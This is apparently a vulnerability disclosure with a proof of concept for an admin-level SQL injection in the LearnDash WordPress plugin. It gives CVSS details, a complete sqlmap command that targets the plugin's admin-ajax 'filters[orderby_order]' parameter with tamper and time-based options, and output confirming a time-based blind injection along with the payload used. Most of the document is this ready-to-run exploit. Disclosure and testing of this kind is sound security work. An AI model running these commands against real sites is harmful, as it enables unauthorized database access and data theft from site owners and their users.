# LearnDash Sqli
LearnDash <= 4.25.6 - Admin+ SQL Injection

# Description

LearnDash Wordpress plugin version below 4.25.6 is vulnerable to Admin+ SQL Injection.

## Details

- **Type**: plugin
- **Slug**: sfwd-lms
- **Affected Version**: 
- **CVSS Score**: 9.8
- **CVSS Rating**: Critical
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

POC
---

```
sqlmap -u "http://localhost:8080/wp-admin/admin-ajax.php?
  action=learndash_propanel_template&nonce=98cba41bf0&template=activity_rows&args%5Bpaged%5D=1&args%5Bper_page%5D=5&filters%5Borderby_order%5D=ld_user_activity.activity_updated%20DESC" \
    --cookie="wordpress_logged_in_37d007a56d816107ce5b52c10342db37=admin%7C1771776192%7ClX6M99Hllm98hVC0AiyYEbHwwdxqQFMkFGAiCexQxXn%7Cc8755fe9da97ea20031e303f4c4d20985b9ef3e464bba8f6648acab174b06191;
  wordpress_test_cookie=WP%20Cookie%20check" \
    -p "filters[orderby_order]" \
    --dbms=mysql \
    --batch \
    --level=5 \
    --risk=3 \
    --technique=T \
    --time-sec=5 \
    --tamper=space2comment \
    --ignore-code=403 \
    --flush-session \
    --output-dir=/tmp/sqlmap-ld

```

Output
---

```
[16:26:49] [INFO] checking if the injection point on GET parameter 'filters[orderby_order]' is a false positive
  GET parameter 'filters[orderby_order]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
  sqlmap identified the following injection point(s) with a total of 1114 HTTP(s) requests:
  ---
  Parameter: filters[orderby_order] (GET)
      Type: time-based blind
      Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
      Payload: action=learndash_propanel_template&nonce=98cba41bf0&template=activity_rows&args[paged]=1&args[per_page]=5&filters[orderby_order]=ld_user_activity.activity_updated DESC PROCEDURE
  ANALYSE(EXTRACTVALUE(3768,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x70564c51))))),1)# VdvA
  ---
  [16:27:18] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
  do you want to exploit this SQL injection? [Y/n] Y
  [16:27:18] [INFO] the back-end DBMS is MySQL
  [16:27:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
  do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
  web server operating system: Linux Debian
  web application technology: Apache 2.4.59, PHP 8.1.29
  back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
  ```
